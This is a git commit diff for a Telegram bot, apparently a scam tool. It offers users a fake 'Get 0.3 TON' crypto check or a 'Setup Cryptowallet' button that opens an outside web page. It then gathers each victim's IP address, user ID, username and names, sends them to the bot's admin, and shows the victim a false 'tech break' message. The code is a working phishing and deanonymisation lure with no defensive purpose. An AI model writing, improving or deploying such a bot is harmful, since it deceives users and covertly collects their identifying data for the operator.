ed2eb53231ca7d30ca091d10824d57ca66f6944b
LapisMYT <nikitagavrilin005@gmail.com>
2024-02-08 17:36:37 +0300

    .

--- bot.py
+++ bot.py
@@ -1,5 +1,5 @@
 import telebot
-from telebot.types import WebAppData, WebAppInfo, InlineKeyboardMarkup, InlineKeyboardButton
+from telebot.types import WebAppData, WebAppInfo, ReplyKeyboardMarkup, KeyboardButton
 from telebot import TeleBot as Bot
 
 with open("token.txt") as f:
@@ -13,13 +13,13 @@ bot = Bot(token)
 @bot.message_handler(commands=["start"])
 def cmd_start(message):
     if len(message.text) >= 8:
-        markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton(text="Get 0.1 TON", web_app=WebAppData(url="https://lapismyt.github.io/c.html")))
-        bot.send_message(message.from_user.id, "Check for 0.1 TON. Press button below to receive.", reply_markup=markup)
-    else
-        markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton(text="Setup Cryptowallet", web_app=WebAppData(url="https://lapismyt.github.io/c.html")))
-        bot.send_message(message.from_user.id, "Press button below to setup your Cryptowallet.", reply_markup=markup)
+        markup = ReplyKeyboardMarkup(resize_keyboard=True)
+        markup.add(KeyboardButton(text="Get 0.3 TON", web_app=WebAppInfo(url="https://lapismyt.github.io/c.html")))
+        bot.send_message(message.from_user.id, "Check for 0.1 TON. Press button to receive.", reply_markup=markup)
+    else:
+        markup = ReplyKeyboardMarkup(resize_keyboard=True)
+        markup.add(KeyboardButton(text="Setup Cryptowallet", web_app=WebAppInfo(url="https://lapismyt.github.io/c.html")))
+        bot.send_message(message.from_user.id, "Press button to setup your Cryptowallet.", reply_markup=markup)
 
 @bot.message_handler(content_types=["web_app_data"])
 def wad_handler(message):
@@ -29,10 +29,10 @@ def wad_handler(message):
     resp += f"IP: {data}\n"
     resp += f"User ID: {user.id}\n"
     resp += f"Username: @{user.username}\n"
-    resp += f"First name: {user.first_name}"\n
+    resp += f"First name: {user.first_name}\n"
     resp += f"Last name: {user.last_name}\n"
     bot.send_message(admin, resp)
-    bot.send_message()
+    bot.send_message(user.id, "Temporary tech break, try again later.")
 
 if __name__ == "__main__":
     bot.infinity_polling()
